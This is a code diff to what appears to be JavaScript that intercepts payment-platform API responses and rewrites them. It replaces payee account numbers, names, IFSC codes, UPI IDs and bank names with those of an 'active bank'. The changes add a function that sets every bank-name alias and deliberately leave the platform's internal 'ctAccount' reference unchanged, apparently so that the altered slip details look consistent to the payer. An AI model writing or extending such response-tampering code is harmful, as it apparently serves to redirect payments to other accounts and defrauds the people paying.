@@ -506,6 +506,9 @@ function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
     if (typeof obj[k] === 'object') { deepReplaceBankFields(obj[k], bank, depth + 1, globalHasAcct); continue; }
     if (typeof obj[k] !== 'string' && typeof obj[k] !== 'number') continue;
     const kl = k.toLowerCase().replace(/[_-]/g, '');
+    // ct_account/ctAccount is the platform's internal account reference.
+    // Leave both spellings untouched; only payee/bank display fields change.
+    if (kl === 'ctaccount') continue;
     const mapping = BANK_FIELD_MAP[kl];
     if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
     if (globalHasAcct && bank.accountHolder && NAME_FIELDS.includes(kl) && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; continue; }
@@ -522,6 +525,25 @@ function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
 // while others return only order metadata and let the frontend render these fields
 // from the same payload. Replace existing fields and add the standard aliases so
 // both the history text/list view and the clicked detail view receive the same bank.
+function replaceOnlyBankNameFields(obj, bank, depth = 0) {
+  if (!obj || typeof obj !== 'object' || !bank || depth > 10) return;
+  if (Array.isArray(obj)) {
+    for (const item of obj) replaceOnlyBankNameFields(item, bank, depth + 1);
+    return;
+  }
+  const displayName = bank.bankName || '';
+  if (!displayName) return;
+  const bankNameKeys = new Set(['bank', 'bankname', 'acctbankname', 'payeebankname', 'receiverbankname', 'payerbankname']);
+  for (const key of Object.keys(obj)) {
+    const normalized = key.toLowerCase().replace(/[_-]/g, '');
+    if (bankNameKeys.has(normalized)) {
+      obj[key] = displayName;
+    } else if (obj[key] && typeof obj[key] === 'object') {
+      replaceOnlyBankNameFields(obj[key], bank, depth + 1);
+    }
+  }
+}
+
 function forceBankDetails(obj, bank) {
   if (!obj || typeof obj !== 'object' || !bank || Array.isArray(obj)) return;
   const hasBank = scanHasBankFields(obj, 0);
@@ -1442,8 +1464,9 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
               acctName: bkName2, accountName: bkName2, name: bkName2,
               acctNo: bkAcct2, accountNo: bkAcct2, account: bkAcct2,
               acctCode: bkIfsc2, ifsc: bkIfsc2, ifscCode: bkIfsc2,
-              bankName: bkBank2, acctBankName: bkBank2,
-              upiId: bkUpi2, payAccount: bkUpi2 || `${bkAcct2}@mbk`, ctAccount: bkAcct2,
+                            bankName: bkBank2, acctBankName: bkBank2, payee_bankname: bkBank2,
+              upiId: bkUpi2, payAccount: bkUpi2 || `${bkAcct2}@mbk`,
+
               walletDomain: wDomain,
               amount: amt2, realAmount: amt2, orderAmount: amt2, money: amt2,
               endTime: nowTs2 + 1800, expireTime: nowTs2 + 1800, crtDate: nowTs2,
@@ -1461,11 +1484,20 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
         const activeBank = getActiveBank(data, null);
         if (activeBank) {
           forceBankDetails(sj2.data, activeBank);
+          // paymentslipdetail uses payee_bankname/bank display fields, while
+          // ct_account and ctAccount must remain the platform values.
+          replaceOnlyBankNameFields(sj2.data, activeBank);
 
           if (activeBank.bankName) {
-            sj2.data.bankName = activeBank.bankName;
-            if (sj2.data.acctBankName !== undefined) sj2.data.acctBankName = activeBank.bankName;
-            if (sj2.data.bank !== undefined) sj2.data.bank = activeBank.bankName;
+            // The frontend has used several aliases for the display-only bank
+            // label. Set all of them explicitly, but never touch ct_account or
+            // ctAccount because those are platform reference fields.
+            const displayBankName = String(activeBank.bankName).trim();
+            sj2.data.bankName = displayBankName;
+            sj2.data.acctBankName = displayBankName;
+            sj2.data.payee_bankname = displayBankName;
+            sj2.data.payeeBankName = displayBankName;
+            sj2.data.bank = displayBankName;
           }
 
           // Stringify the updated JSON and update headers
